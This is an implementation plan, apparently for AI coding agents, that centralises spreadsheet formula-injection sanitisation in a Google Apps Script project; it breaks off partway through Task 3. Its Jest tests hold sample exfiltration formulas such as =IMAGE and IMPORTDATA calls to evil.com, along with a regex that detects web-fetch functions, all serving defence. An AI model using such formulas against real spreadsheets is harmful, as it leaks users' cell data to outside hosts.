# T6 Systemic Safe-Writes Fix Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace ad hoc, per-call-site formula-injection sanitization with a single centralized `safe-writes.ts` module that every Apps Script cell write in `src/server/` routes through, closing the AI-75/AI-76 gaps plus two newly-discovered gaps (`formatMarkdownSelection`, `sampleRowsToEvaluation`'s copy), and enforce it mechanically via an ESLint rule so a future write site cannot silently bypass it.

**Architecture:** Four write primitives — `writeSafeValue`, `writeSafeValueGrid`, `writeSafeRichText`, `writeSafeRichTextGrid` — live in a new `src/server/safe-writes.ts`, all built on the existing `sanitizeForCell()` check (relocated there along with `writeColumn`/`findOrCreateColumn`, which become thin callers of the new primitives instead of calling GAS methods directly). Every `setValue`/`setValues`/`setRichTextValue`/`setRichTextValues` call site in `index.ts` is migrated to use these primitives, and a `no-restricted-syntax` ESLint rule then forbids any raw call to those four methods anywhere in `src/server/` outside `safe-writes.ts`.

**Tech Stack:** TypeScript, Jest/ts-jest, ESLint flat config, Google Apps Script (`SpreadsheetApp` / `GoogleAppsScript.Spreadsheet` types).

## Global Constraints

- Design spec: `docs/superpowers/specs/2026-07-15-t6-systemic-safe-writes-design.md` — every task implements a piece of this; don't deviate from its architecture without flagging it.
- Named exports only, no default exports; `const` by default; `===` always; avoid `any` (prefer `unknown`); explicit return types on functions; prefix unused params with `_`; double-quoted strings, semicolons, trailing commas (Prettier-enforced — run `npm run format` if unsure).
- Mock GAS globals (`SpreadsheetApp`, etc.) on `globalThis` **before** importing the module under test — imports execute immediately.
- `src/server/index.ts` is excluded from unit test coverage (too coupled to `SpreadsheetApp` globals per `jest.config.cjs`) — verification for `index.ts` changes is `typecheck` + `lint` + the full existing suite (regression) + manual QA against the dev sheet, not new unit tests.
- The pre-commit hook runs the full Jest suite (`--bail`) and `lint-staged` — every commit must leave the suite green.
- Branch `AI-89-systemic-t6-safe-writes` already exists and is checked out; work directly on it.

---

### Task 1: Build the `safe-writes.ts` module

**Files:**
- Create: `src/server/safe-writes.ts`
- Create: `__tests__/safe-writes.test.ts`
- Modify: `src/server/utils.ts` (remove `sanitizeForCell`, `WEB_FETCH_PATTERN`, `writeColumn`, `findOrCreateColumn`)
- Modify: `__tests__/utils.test.ts` (remove the migrated describe blocks and now-unused imports)
- Modify: `src/server/index.ts:11-38` (import statement only — swap the three relocated names to the new module; call sites are untouched until Tasks 2–5)
- Modify: `jest.config.cjs` (add a `safe-writes.ts` coverage threshold, adjust `utils.ts`'s)

**Interfaces:**
- Produces: `sanitizeForCell(value: string): string` (unchanged signature, relocated); `writeSafeValue(range: GoogleAppsScript.Spreadsheet.Range, value: unknown): void`; `writeSafeValueGrid(range: GoogleAppsScript.Spreadsheet.Range, values: unknown[][]): void`; `writeSafeRichText(range: GoogleAppsScript.Spreadsheet.Range, richTextValue: GoogleAppsScript.Spreadsheet.RichTextValue): void`; `writeSafeRichTextGrid(range: GoogleAppsScript.Spreadsheet.Range, grid: GoogleAppsScript.Spreadsheet.RichTextValue[][]): void`; `writeColumn(sheet, colIdx, values: string[], wrapStrategy?): void` (unchanged signature, relocated + internals refactored); `findOrCreateColumn(sheet, title, wrapStrategy?): number` (unchanged signature, relocated + internals refactored)
- Consumes: nothing from other tasks (this is the foundation).

- [ ] **Step 1: Create `src/server/safe-writes.ts` with the module doc comment, the relocated `sanitizeForCell`, and its `WEB_FETCH_PATTERN` constant**

```ts
/**
 * safe-writes.ts — The only file permitted to call setValue/setValues/
 * setRichTextValue/setRichTextValues in src/server/. Every Apps Script write
 * of content that the acting user did not directly type into that specific
 * cell (AI output, Drive-extracted text, a re-write of existing cell
 * content, a recipe form-field value) must go through one of the four
 * writeSafe* primitives below. Enforced by an ESLint rule — see
 * eslint.config.mjs. See docs/threat_models/ssi-toolkit-threat-model.md, T6.
 */

// Sheets functions that make outbound HTTP requests — the exfiltration vector for formula injection.
// We scan the whole formula body so nested calls like =IF(1=1,IMAGE("evil"),0) are caught too.
const WEB_FETCH_PATTERN = /\b(image|importdata|importxml|importhtml|importrange|importfeed)\s*\(/i;

/**
 * Prevent formula injection when writing untrusted-origin text to a Sheets cell.
 *
 * Sheets evaluates values beginning with =, +, or - as formulas. If the formula
 * contains a web-fetch function (IMAGE, IMPORTDATA, IMPORTXML, IMPORTHTML, IMPORTRANGE,
 * IMPORTFEED) — anywhere in the formula, including nested positions — it could make an
 * outbound HTTP request that exfiltrates adjacent cell data. Those values are rejected
 * with an explicit error string.
 *
 * Other formula-prefixed values (=SUM, -IF, etc.) are safe to prefix with ' so Sheets
 * treats them as literal text instead of evaluating them — this is a correctness
 * guarantee (untrusted text displays as written, not silently reinterpreted) as much
 * as a security one.
 */
export function sanitizeForCell(value: string): string {
  if (!value.length || !/^[=+-]/.test(value[0])) return value;
  if (WEB_FETCH_PATTERN.test(value)) {
    return "[SSI Error: AI response contained an external request formula — output rejected]";
  }
  return `'${value}`;
}
```

- [ ] **Step 2: Create `__tests__/safe-writes.test.ts`, moving the `sanitizeForCell` tests from `utils.test.ts` verbatim**

```ts
/**
 * Tests for src/server/safe-writes.ts — the only sanctioned path for writing
 * untrusted-origin content to a Sheets cell. See T6 in the threat model.
 */

import { sanitizeForCell } from "../src/server/safe-writes";

describe("sanitizeForCell", () => {
  const REJECTION_MSG =
    "[SSI Error: AI response contained an external request formula — output rejected]";

  it("rejects =IMAGE formula (exfiltrates cell data via image URL)", () => {
    expect(sanitizeForCell('=IMAGE("https://evil.com/?d="&A1)')).toBe(REJECTION_MSG);
  });

  it("rejects +IMPORTDATA formula (fetches external URL via + prefix)", () => {
    expect(sanitizeForCell("+IMPORTDATA(A1)")).toBe(REJECTION_MSG);
  });

  it("rejects -IMPORTXML formula", () => {
    expect(sanitizeForCell('-IMPORTXML(A1, "//b")')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTHTML formula", () => {
    expect(sanitizeForCell('=IMPORTHTML("http://evil.com", "table", 1)')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTRANGE formula", () => {
    expect(sanitizeForCell('=IMPORTRANGE("spreadsheetId", "A1:A10")')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTFEED formula", () => {
    expect(sanitizeForCell('=IMPORTFEED("http://evil.com/rss")')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function nested inside another formula", () => {
    expect(sanitizeForCell('=IF(1=1,IMAGE("evil.com"),0)')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function nested inside IFERROR", () => {
    expect(sanitizeForCell('=IFERROR(IMPORTDATA("http://evil.com"),0)')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function name regardless of case", () => {
    expect(sanitizeForCell('=image("evil.com")')).toBe(REJECTION_MSG);
  });

  it("prepends apostrophe to non-web-fetch formula starting with =", () => {
    expect(sanitizeForCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
  });

  it("prepends apostrophe to non-web-fetch formula starting with - (defense-in-depth)", () => {
    expect(sanitizeForCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
  });

  it("prepends apostrophe to non-web-fetch formula starting with +", () => {
    expect(sanitizeForCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
  });

  it("leaves normal AI response text unchanged", () => {
    expect(sanitizeForCell("The subject appeared in three court filings.")).toBe(
      "The subject appeared in three court filings.",
    );
  });

  it("leaves empty string unchanged", () => {
    expect(sanitizeForCell("")).toBe("");
  });

  it("leaves values with leading whitespace unchanged (Sheets does not evaluate as formula)", () => {
    expect(sanitizeForCell("  =not evaluated as formula")).toBe("  =not evaluated as formula");
  });

  it("preserves the full response when prepending apostrophe to a safe multiline formula", () => {
    const input = "=SUM(A1:A10)\nNote: this formula sums the range";
    expect(sanitizeForCell(input)).toBe(`'${input}`);
  });
});
```

- [ ] **Step 3: Remove `sanitizeForCell` and `WEB_FETCH_PATTERN` from `src/server/utils.ts`, and remove its describe block + `sanitizeForCell` import from `__tests__/utils.test.ts`**

In `utils.ts`, delete the `WEB_FETCH_PATTERN` constant and the `sanitizeForCell` function (currently the last two definitions in the file). In `utils.test.ts`, delete the entire `describe("sanitizeForCell", ...)` block and remove `sanitizeForCell` from the import list at the top of the file.

- [ ] **Step 4: Run the full suite to confirm the move didn't break anything**

Run: `npm test`
Expected: All suites pass, including the new `safe-writes.test.ts` and the trimmed `utils.test.ts`.

- [ ] **Step 5: Commit**

```bash
git add src/server/safe-writes.ts src/server/utils.ts __tests__/safe-writes.test.ts __tests__/utils.test.ts
git commit -m "refactor(security): relocate sanitizeForCell to new safe-writes module"
```

- [ ] **Step 6: Write failing tests for `writeSafeValue`**

Append to `__tests__/safe-writes.test.ts`:

```ts
describe("writeSafeValue", () => {
  it("writes a safe string value to the range unchanged", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, "hello");
    expect(setValueMock).toHaveBeenCalledWith("hello");
  });

  it("rejects a web-fetch formula", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, '=IMAGE("evil.com")');
    expect(setValueMock).toHaveBeenCalledWith(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });

  it("literal-izes a non-web-fetch formula", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, "=SUM(A1:A10)");
    expect(setValueMock).toHaveBeenCalledWith("'=SUM(A1:A10)");
  });

  it("passes non-string values through unchanged (numbers can never be a sheet function)", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, 42);
    expect(setValueMock).toHaveBeenCalledWith(42);
  });
});
```

Update the import line at the top of the file to:

```ts
import { sanitizeForCell, writeSafeValue } from "../src/server/safe-writes";
```

- [ ] **Step 7: Run the test to verify it fails**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeValue"`
Expected: FAIL — `writeSafeValue is not a function` (or a TypeScript compile error on the missing export).

- [ ] **Step 8: Implement `writeSafeValue` in `src/server/safe-writes.ts`**

```ts
type Range = GoogleAppsScript.Spreadsheet.Range;

export function writeSafeValue(range: Range, value: unknown): void {
  range.setValue(typeof value === "string" ? sanitizeForCell(value) : value);
}
```

- [ ] **Step 9: Run the test to verify it passes**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeValue"`
Expected: PASS (4 tests).

- [ ] **Step 10: Commit**

```bash
git add src/server/safe-writes.ts __tests__/safe-writes.test.ts
git commit -m "feat(security): add writeSafeValue primitive"
```

- [ ] **Step 11: Write failing tests for `writeSafeValueGrid`**

Append to `__tests__/safe-writes.test.ts`:

```ts
describe("writeSafeValueGrid", () => {
  it("sanitizes every string cell and writes the whole grid in one setValues call", () => {
    const setValuesMock = jest.fn();
    const range = { setValues: setValuesMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValueGrid(range, [
      ["safe text", '=IMAGE("evil.com")'],
      ["=SUM(A1:A10)", "more text"],
    ]);
    expect(setValuesMock).toHaveBeenCalledTimes(1);
    expect(setValuesMock).toHaveBeenCalledWith([
      [
        "safe text",
        "[SSI Error: AI response contained an external request formula — output rejected]",
      ],
      ["'=SUM(A1:A10)", "more text"],
    ]);
  });

  it("passes non-string cells (numbers, booleans, dates) through unchanged", () => {
    const setValuesMock = jest.fn();
    const range = { setValues: setValuesMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    const date = new Date(2026, 0, 1);
    writeSafeValueGrid(range, [[42, true, date]]);
    expect(setValuesMock).toHaveBeenCalledWith([[42, true, date]]);
  });
});
```

Update the import line to:

```ts
import { sanitizeForCell, writeSafeValue, writeSafeValueGrid } from "../src/server/safe-writes";
```

- [ ] **Step 12: Run the test to verify it fails**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeValueGrid"`
Expected: FAIL — `writeSafeValueGrid is not a function`.

- [ ] **Step 13: Implement `writeSafeValueGrid`**

```ts
export function writeSafeValueGrid(range: Range, values: unknown[][]): void {
  range.setValues(
    values.map((row) => row.map((v) => (typeof v === "string" ? sanitizeForCell(v) : v))),
  );
}
```

- [ ] **Step 14: Run the test to verify it passes**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeValueGrid"`
Expected: PASS (2 tests).

- [ ] **Step 15: Commit**

```bash
git add src/server/safe-writes.ts __tests__/safe-writes.test.ts
git commit -m "feat(security): add writeSafeValueGrid primitive"
```

- [ ] **Step 16: Write failing tests for `writeSafeRichText`, including a `SpreadsheetApp.newRichTextValue` fake**

At the very top of `__tests__/safe-writes.test.ts` (before the imports — GAS globals must be mocked before the module under test is imported), add:

```ts
function makeRichTextBuilder() {
  let builtText = "";
  const builder = {
    setText: (t: string) => {
      builtText = t;
      return builder;
    },
    build: () => ({ getText: () => builtText }) as GoogleAppsScript.Spreadsheet.RichTextValue,
  };
  return builder;
}

(globalThis as unknown as { SpreadsheetApp: unknown }).SpreadsheetApp = {
  newRichTextValue: () => makeRichTextBuilder(),
};
```

Append to the bottom of the file:

```ts
function makeRichTextValue(text: string): GoogleAppsScript.Spreadsheet.RichTextValue {
  return { getText: () => text } as unknown as GoogleAppsScript.Spreadsheet.RichTextValue;
}

describe("writeSafeRichText", () => {
  it("writes the original RichTextValue unchanged when the flattened text is safe", () => {
    const setRichTextValueMock = jest.fn();
    const range = {
      setRichTextValue: setRichTextValueMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    const richTextValue = makeRichTextValue("**bold** safe text");
    writeSafeRichText(range, richTextValue);
    expect(setRichTextValueMock).toHaveBeenCalledWith(richTextValue);
  });

  it("drops formatting and rejects when the flattened text is a web-fetch formula", () => {
    const setRichTextValueMock = jest.fn();
    const range = {
      setRichTextValue: setRichTextValueMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeRichText(range, makeRichTextValue('=IMPORTDATA("evil.com")'));
    const written = setRichTextValueMock.mock
      .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue;
    expect(written.getText()).toBe(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });

  it("drops formatting and literal-izes when the flattened text is a benign formula", () => {
    const setRichTextValueMock = jest.fn();
    const range = {
      setRichTextValue: setRichTextValueMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeRichText(range, makeRichTextValue("=SUM(A1:A10)"));
    const written = setRichTextValueMock.mock
      .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue;
    expect(written.getText()).toBe("'=SUM(A1:A10)");
  });
});
```

Update the import line to:

```ts
import {
  sanitizeForCell,
  writeSafeValue,
  writeSafeValueGrid,
  writeSafeRichText,
} from "../src/server/safe-writes";
```

- [ ] **Step 17: Run the test to verify it fails**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeRichText"`
Expected: FAIL — `writeSafeRichText is not a function`.

- [ ] **Step 18: Implement `sanitizeRichTextValue` (internal) and `writeSafeRichText`**

```ts
type RichTextValue = GoogleAppsScript.Spreadsheet.RichTextValue;

/** Rich-text counterpart: safe if sanitizeForCell leaves the flattened text untouched;
 *  otherwise formatting is dropped and the sanitized text becomes plain content. */
function sanitizeRichTextValue(cell: RichTextValue): RichTextValue {
  const text = cell.getText();
  const sanitized = sanitizeForCell(text);
  return sanitized === text ? cell : SpreadsheetApp.newRichTextValue().setText(sanitized).build();
}

export function writeSafeRichText(range: Range, richTextValue: RichTextValue): void {
  range.setRichTextValue(sanitizeRichTextValue(richTextValue));
}
```

- [ ] **Step 19: Run the test to verify it passes**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeRichText"`
Expected: PASS (3 tests).

- [ ] **Step 20: Commit**

```bash
git add src/server/safe-writes.ts __tests__/safe-writes.test.ts
git commit -m "feat(security): add writeSafeRichText primitive"
```

- [ ] **Step 21: Write failing tests for `writeSafeRichTextGrid`**

Append to `__tests__/safe-writes.test.ts`:

```ts
describe("writeSafeRichTextGrid", () => {
  it("sanitizes every cell in the grid via a single setRichTextValues call", () => {
    const setRichTextValuesMock = jest.fn();
    const range = {
      setRichTextValues: setRichTextValuesMock,
    } as unknown as GoogleAppsScript.Spreadsheet.Range;
    const safeCell = makeRichTextValue("safe text");
    const dangerousCell = makeRichTextValue('=IMAGE("evil.com")');
    writeSafeRichTextGrid(range, [[safeCell, dangerousCell]]);
    expect(setRichTextValuesMock).toHaveBeenCalledTimes(1);
    const [[writtenSafe, writtenDangerous]] = setRichTextValuesMock.mock
      .calls[0][0] as GoogleAppsScript.Spreadsheet.RichTextValue[][];
    expect(writtenSafe).toBe(safeCell);
    expect(writtenDangerous.getText()).toBe(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });
});
```

Update the import line to:

```ts
import {
  sanitizeForCell,
  writeSafeValue,
  writeSafeValueGrid,
  writeSafeRichText,
  writeSafeRichTextGrid,
} from "../src/server/safe-writes";
```

- [ ] **Step 22: Run the test to verify it fails**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeRichTextGrid"`
Expected: FAIL — `writeSafeRichTextGrid is not a function`.

- [ ] **Step 23: Implement `writeSafeRichTextGrid`**

```ts
export function writeSafeRichTextGrid(range: Range, grid: RichTextValue[][]): void {
  range.setRichTextValues(grid.map((row) => row.map(sanitizeRichTextValue)));
}
```

- [ ] **Step 24: Run the test to verify it passes**

Run: `npx jest __tests__/safe-writes.test.ts -t "writeSafeRichTextGrid"`
Expected: PASS (1 test).

- [ ] **Step 25: Commit**

```bash
git add src/server/safe-writes.ts __tests__/safe-writes.test.ts
git commit -m "feat(security): add writeSafeRichTextGrid primitive"
```

- [ ] **Step 26: Move `writeColumn` from `utils.ts` to `safe-writes.ts`, refactored to call `writeSafeValueGrid`**

Delete `writeColumn` from `src/server/utils.ts`. Add to `src/server/safe-writes.ts`:

```ts
/**
 * Write an array of string values to a column starting at row 2.
 * Sanitizes every value before writing. Pass wrapStrategy to apply a wrap
 * format to the entire written range.
 */
export function writeColumn(
  sheet: GoogleAppsScript.Spreadsheet.Sheet,
  colIdx: number,
  values: string[],
  wrapStrategy?: GoogleAppsScript.Spreadsheet.WrapStrategy,
): void {
  if (values.length === 0) return;
  const range = sheet.getRange(2, colIdx, values.length, 1);
  writeSafeValueGrid(
    range,
    values.map((v) => [v]),
  );
  if (wrapStrategy !== undefined) {
    range.setWrapStrategy(wrapStrategy);
  }
}
```

- [ ] **Step 27: Move `writeColumn`'s tests from `utils.test.ts` to `safe-writes.test.ts`, and add a sanitization test**

Delete the `describe("writeColumn", ...)` block and the `writeColumn` import from `__tests__/utils.test.ts`. Append to `__tests__/safe-writes.test.ts` (updating the import line to add `writeColumn`):

```ts
describe("writeColumn", () => {
  it("writes values starting at row 2 using a single setValues call", () => {
    const setValuesMock = jest.fn();
    const sheet = {
      getRange: jest.fn().mockReturnValue({ setValues: setValuesMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    writeColumn(sheet, 3, ["a", "b", "c"]);
    expect(sheet.getRange).toHaveBeenCalledWith(2, 3, 3, 1);
    expect(setValuesMock).toHaveBeenCalledWith([["a"], ["b"], ["c"]]);
  });

  it("does nothing when values array is empty", () => {
    const sheet = {
      getRange: jest.fn(),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    writeColumn(sheet, 1, []);
    expect(sheet.getRange).not.toHaveBeenCalled();
  });

  it("applies wrapStrategy to the written range when provided", () => {
    const setValuesMock = jest.fn();
    const setWrapStrategyMock = jest.fn();
    const sheet = {
      getRange: jest
        .fn()
        .mockReturnValue({ setValues: setValuesMock, setWrapStrategy: setWrapStrategyMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    const wrapStrategy = "CLIP" as unknown as GoogleAppsScript.Spreadsheet.WrapStrategy;
    writeColumn(sheet, 3, ["a", "b"], wrapStrategy);
    expect(setWrapStrategyMock).toHaveBeenCalledWith(wrapStrategy);
  });

  it("sanitizes a dangerous value before writing", () => {
    const setValuesMock = jest.fn();
    const sheet = {
      getRange: jest.fn().mockReturnValue({ setValues: setValuesMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    writeColumn(sheet, 3, ['=IMAGE("evil.com")', "safe"]);
    expect(setValuesMock).toHaveBeenCalledWith([
      ["[SSI Error: AI response contained an external request formula — output rejected]"],
      ["safe"],
    ]);
  });
});
```

- [ ] **Step 28: Run the full suite to verify the move + new behavior**

Run: `npm test`
Expected: All suites pass, including the 4 `writeColumn` tests in `safe-writes.test.ts`.

- [ ] **Step 29: Commit**

```bash
git add src/server/safe-writes.ts src/server/utils.ts __tests__/safe-writes.test.ts __tests__/utils.test.ts
git commit -m "refactor(security): relocate writeColumn to safe-writes, sanitize its writes"
```

- [ ] **Step 30: Move `findOrCreateColumn` from `utils.ts` to `safe-writes.ts`, refactored to call `writeSafeValue`**

Delete `findOrCreateColumn` from `src/server/utils.ts`. Add to `src/server/safe-writes.ts`:

```ts
/**
 * Find a column by header title in row 1, or append a new one.
 * Returns the 1-based column index. The new column's title is sanitized
 * before writing. Pass wrapStrategy to apply a wrap format to the entire
 * new column on creation.
 */
export function findOrCreateColumn(
  sheet: GoogleAppsScript.Spreadsheet.Sheet,
  title: string,
  wrapStrategy?: GoogleAppsScript.Spreadsheet.WrapStrategy,
): number {
  const lastCol = sheet.getLastColumn();
  if (lastCol > 0) {
    const headers = sheet.getRange(1, 1, 1, lastCol).getValues()[0] as string[];
    const idx = headers.indexOf(title);
    if (idx !== -1) return idx + 1;
  }
  const newCol = lastCol + 1;
  writeSafeValue(sheet.getRange(1, newCol), title);
  if (wrapStrategy !== undefined) {
    sheet.getRange(1, newCol, sheet.getMaxRows(), 1).setWrapStrategy(wrapStrategy);
  }
  return newCol;
}
```

- [ ] **Step 31: Move `findOrCreateColumn`'s tests, and add a sanitization test**

Delete the `describe("findOrCreateColumn", ...)` block and the `findOrCreateColumn` import from `__tests__/utils.test.ts`. Append to `__tests__/safe-writes.test.ts` (updating the import line to add `findOrCreateColumn`):

```ts
describe("findOrCreateColumn", () => {
  function makeSheet(headers: string[]): GoogleAppsScript.Spreadsheet.Sheet {
    const values = [headers.slice()];
    return {
      getLastColumn: () => headers.length,
      getRange: jest
        .fn()
        .mockImplementation((_row: number, _col: number, numRows?: number, numCols?: number) => {
          if (numRows === 1 && numCols !== undefined) {
            return { getValues: () => values };
          }
          return { setValue: jest.fn() };
        }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
  }

  it("returns 1-based index of existing column", () => {
    const sheet = makeSheet(["Drive Link", "System Prompt", "Output"]);
    expect(findOrCreateColumn(sheet, "System Prompt")).toBe(2);
  });

  it("appends new column and returns its 1-based index when not found", () => {
    const sheet = makeSheet(["Drive Link"]);
    const setValueMock = jest.fn();
    (sheet.getRange as jest.Mock).mockImplementation(
      (_row: number, _col: number, numRows?: number, numCols?: number) => {
        if (numRows === 1 && numCols !== undefined) {
          return { getValues: () => [["Drive Link"]] };
        }
        return { setValue: setValueMock };
      },
    );
    const idx = findOrCreateColumn(sheet, "New Col");
    expect(idx).toBe(2);
    expect(setValueMock).toHaveBeenCalledWith("New Col");
  });

  it("appends to column 1 when sheet is empty", () => {
    const setValueMock = jest.fn();
    const sheet = {
      getLastColumn: () => 0,
      getRange: jest.fn().mockReturnValue({ setValue: setValueMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    const idx = findOrCreateColumn(sheet, "My Col");
    expect(idx).toBe(1);
    expect(setValueMock).toHaveBeenCalledWith("My Col");
  });

  it("applies wrapStrategy to the new column range when provided", () => {
    const setValueMock = jest.fn();
    const setWrapStrategyMock = jest.fn();
    const sheet = {
      getLastColumn: () => 0,
      getMaxRows: () => 100,
      getRange: jest
        .fn()
        .mockImplementation((_row: number, _col: number, numRows?: number) =>
          numRows !== undefined
            ? { setWrapStrategy: setWrapStrategyMock }
            : { setValue: setValueMock },
        ),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    const wrapStrategy = "CLIP" as unknown as GoogleAppsScript.Spreadsheet.WrapStrategy;
    findOrCreateColumn(sheet, "My Col", wrapStrategy);
    expect(setWrapStrategyMock).toHaveBeenCalledWith(wrapStrategy);
  });

  it("sanitizes a dangerous new column title before writing", () => {
    const setValueMock = jest.fn();
    const sheet = {
      getLastColumn: () => 0,
      getRange: jest.fn().mockReturnValue({ setValue: setValueMock }),
    } as unknown as GoogleAppsScript.Spreadsheet.Sheet;
    findOrCreateColumn(sheet, '=IMAGE("evil.com")');
    expect(setValueMock).toHaveBeenCalledWith(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });
});
```

- [ ] **Step 32: Update `src/server/index.ts`'s import statement to pull the three relocated names from `./safe-writes`**

In `src/server/index.ts`, change:

```ts
import {
  extractId,
  isValidDriveLink,
  getAllFilesRecursive,
  sampleRows,
  truncateText,
  resolveColumns,
  findOrCreateColumn,
  writeColumn,
  writeJobProgress,
  interpolateTemplate,
  flattenArg,
  markAIOutputRange,
  sanitizeForCell,
  resolveGroundingUris,
} from "./utils";
```

to:

```ts
import {
  extractId,
  isValidDriveLink,
  getAllFilesRecursive,
  sampleRows,
  truncateText,
  resolveColumns,
  writeJobProgress,
  interpolateTemplate,
  flattenArg,
  markAIOutputRange,
  resolveGroundingUris,
} from "./utils";
import { findOrCreateColumn, writeColumn, sanitizeForCell } from "./safe-writes";
```

Do not touch any call sites yet — `sanitizeForCell(result.text)` is still called directly in `runBatchAI` at this point (Task 3 replaces it).

- [ ] **Step 33: Run typecheck, lint, and the full suite**

Run: `npm run typecheck && npm run lint && npm test`
Expected: All three pass with no errors.

- [ ] **Step 34: Measure coverage and set thresholds for the new/changed files**

Run: `npm run test:coverage`

Read the reported statements/branches/functions percentages for `src/server/safe-writes.ts` and `src/server/utils.ts`. In `jest.config.cjs`:
- Replace the existing `"./src/server/utils.ts": { statements: 83, branches: 93, functions: 100 }` entry with numbers 5 points below the newly observed utils.ts percentages (rounding down), matching the file's own stated convention in its header comment.
- Add a new entry, `"./src/server/safe-writes.ts"`, with numbers 5 points below the observed safe-writes.ts percentages.

- [ ] **Step 35: Run coverage again to confirm the new thresholds pass**

Run: `npm run test:coverage`
Expected: PASS — no threshold violations.

- [ ] **Step 36: Commit**

```bash
git add src/server/safe-writes.ts src/server/utils.ts src/server/index.ts __tests__/safe-writes.test.ts __tests__/utils.test.ts jest.config.cjs
git commit -m "refactor(security): relocate findOrCreateColumn, wire index.ts to safe-writes"
```

---

### Task 2: Migrate `extractText` (AI-75)

**Files:**
- Modify: `src/server/index.ts:164` (call site), `index.ts` import block (add `writeSafeValue`)

**Interfaces:**
- Consumes: `writeSafeValue(range, value: unknown): void` from Task 1.

- [ ] **Step 1: Add `writeSafeValue` to the `./safe-writes` import in `index.ts`**

```ts
import { findOrCreateColumn, writeColumn, sanitizeForCell, writeSafeValue } from "./safe-writes";
```

- [ ] **Step 2: Replace the raw write in `extractText`**

Change:

```ts
    const fileId = extractId(cellValue);
    const text = truncateText(extractTextUniversal(fileId), 49000);
    sheet.getRange(rowIdx, outputCol).setValue(text);
    SpreadsheetApp.flush();
```

to:

```ts
    const fileId = extractId(cellValue);
    const text = truncateText(extractTextUniversal(fileId), 49000);
    writeSafeValue(sheet.getRange(rowIdx, outputCol), text);
    SpreadsheetApp.flush();
```

- [ ] **Step 3: Run typecheck, lint, and the full suite**

Run: `npm run typecheck && npm run lint && npm test`
Expected: All pass (no unit tests exercise `extractText` directly — `index.ts` is excluded from coverage per `jest.config.cjs` — this is a regression check on the rest of the suite).

- [ ] **Step 4: Commit**

```bash
git add src/server/index.ts
git commit -m "fix(security): route extractText's write through writeSafeValue (AI-75)"
```

---

### Task 3: Migrate `runBatchAI` (AI-56 consolidation, AI-76)

**Files:**
- Modify: `src/server/index.ts:244-264, 542-566` (call sites), `index.ts` import block (add `writeSafeRichText`, remove `sanitizeForCell` once its last direct use is gone)

**Interfaces:**
- Consumes: `writeSafeValue`, `writeSafeRichText` from Task 1.

- [ ] **Step 1: Update the `./safe-writes` import — add `writeSafeRichText`, drop `sanitizeForCell` (no longer called directly in `index.ts` after this task)**

```ts
import {
  findOrCreateColumn,
  writeColumn,
  writeSafeValue,
  writeSafeRichText,
} from "./safe-writes";
```

- [ ] **Step 2: Replace the `applyMarkdown` branch and its catch-fallback**

Change:

```ts
    if (config.applyMarkdown) {
      try {
        sheet
          .getRange(realRowIndex, outputIdx + 1)
          .setRichTextValue(toCellValue(parseMarkdown(injectCitations(result, resolvedUris))));
      } catch (_e) {
        sheet.getRange(realRowIndex, outputIdx + 1).setValue(sanitizeForCell(result.text));
      }
    } else {
      sheet.getRange(realRowIndex, outputIdx + 1).setValue(sanitizeForCell(result.text));
    }
```

to:

```ts
    if (config.applyMarkdown) {
      try {
        writeSafeRichText(
          sheet.getRange(realRowIndex, outputIdx + 1),
          toCellValue(parseMarkdown(injectCitations(result, resolvedUris))),
        );
      } catch (_e) {
        writeSafeValue(sheet.getRange(realRowIndex, outputIdx + 1), result.text);
      }
    } else {
      writeSafeValue(sheet.getRange(realRowIndex, outputIdx + 1), result.text);
    }
```

(The try/catch still exists solely to catch markdown-*parsing* exceptions from `parseMarkdown`/`toCellValue` — unrelated to sanitization, and unchanged in purpose.)

- [ ] **Step 3: Replace the grounding-column write**

Change:

```ts
    if (config.includeGrounding && groundingIdx >= 0) {
      const groundingMarkdown = groundingToMarkdown(result, resolvedUris);
      if (groundingMarkdown !== null) {
        sheet
